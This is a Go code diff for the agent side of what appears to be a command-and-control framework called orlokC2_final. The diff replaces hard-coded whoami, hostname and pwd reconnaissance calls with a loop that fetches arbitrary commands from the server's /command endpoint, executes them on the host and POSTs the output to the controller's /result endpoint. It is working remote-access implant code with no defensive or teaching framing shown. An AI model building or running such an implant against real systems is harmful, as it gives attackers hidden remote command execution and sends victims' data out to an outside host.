@@ -1,14 +1,16 @@
 package agent
 
 import (
+	"bytes"
+	"encoding/json"
 	"fmt"
 	"io"
-	"orlokC2_final/internal/modules"
-	"orlokC2_final/internal/types"
-	"time"
+	"net/http"
 
+	"orlokC2_final/internal/agent/commands"
 	"orlokC2_final/internal/agent/config"
 	"orlokC2_final/internal/agent/protocols"
+	"time"
 )
 
 // Agent manages the C2 communication
@@ -94,51 +96,29 @@ func (a *Agent) runLoop() {
 				continue
 			}
 
-			// Send request to root endpoint
-			resp, err := a.Protocol.SendRequest("/")
+			// Check for commands
+			resp, err := a.Protocol.SendRequest("/command")
 			if err != nil {
-				fmt.Printf("Request error: %v\n", err)
+				fmt.Printf("Command check error: %v\n", err)
 				time.Sleep(a.Config.ReconnectDelay)
 				continue
 			}
 
-			// Process response
+			// Process command response
 			body, err := io.ReadAll(resp.Body)
 			resp.Body.Close()
 			if err == nil {
-				currentTime := time.Now().Format("2006-01-02 15:04:05.000")
-				fmt.Printf("[%s] Response: %s\n", currentTime, string(body))
-			}
-
-			// Execute commands and send results
-			cmdResults := []*types.CommandResult{
-				ExecuteCommand("whoami", modules.GetWhoami),
-				ExecuteCommand("hostname", modules.GetHostname),
-				ExecuteCommand("pwd", modules.GetPwd),
-			}
-
-			// Fill in the agent UUID for each result
-			for _, result := range cmdResults {
-				result.AgentUUID = a.Config.AgentUUID
-			}
-
-			// Send each result to the server
-			for _, result := range cmdResults {
-				// Encode the result
-				data, err := EncodeResult(result)
-				if err != nil {
-					fmt.Printf("Failed to encode result: %v\n", err)
-					continue
+				// Parse the response
+				var cmdResp struct {
+					Command    string `json:"command"`
+					HasCommand bool   `json:"hasCommand"`
 				}
-
-				// Send the result to the server
-				_, err = a.Protocol.SendPostRequest("/results", data)
-				if err != nil {
-					fmt.Printf("Failed to send result: %v\n", err)
-					continue
+				if err := json.Unmarshal(body, &cmdResp); err == nil {
+					if cmdResp.HasCommand {
+						// Execute the command
+						a.executeCommand(cmdResp.Command)
+					}
 				}
-
-				fmt.Printf("Sent %s result to server\n", result.Command)
 			}
 
 			// Sleep before next check-in
@@ -146,4 +126,61 @@ func (a *Agent) runLoop() {
 			time.Sleep(sleepTime)
 		}
 	}
+}
+
+// executeCommand handles command execution and sending results
+func (a *Agent) executeCommand(command string) {
+	fmt.Printf("Executing command: %s\n", command)
+
+	// Execute the command
+	output, err := commands.Execute(command)
+
+	// Prepare result
+	status := "success"
+	if err != nil {
+		output = err.Error()
+		status = "error"
+	}
+
+	// Create result JSON
+	result := struct {
+		Command string `json:"command"`
+		Output  string `json:"output"`
+		Status  string `json:"status"`
+	}{
+		Command: command,
+		Output:  output,
+		Status:  status,
+	}
+
+	// Convert to JSON
+	resultJSON, err := json.Marshal(result)
+	if err != nil {
+		fmt.Printf("Error marshaling result: %v\n", err)
+		return
+	}
+
+	// Send the result back to the server
+	reader := bytes.NewReader(resultJSON)
+	req, err := http.NewRequest("POST", fmt.Sprintf("http://%s:%d/result",
+		a.Config.TargetHost, a.Config.TargetPort), reader)
+	if err != nil {
+		fmt.Printf("Error creating result request: %v\n", err)
+		return
+	}
+
+	// Add headers
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("X-Agent-ID", a.Config.AgentUUID)
+
+	// Send the request
+	client := &http.Client{Timeout: a.Config.RequestTimeout}
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Printf("Error sending result: %v\n", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	fmt.Printf("Command execution complete: %s\n", command)
 }
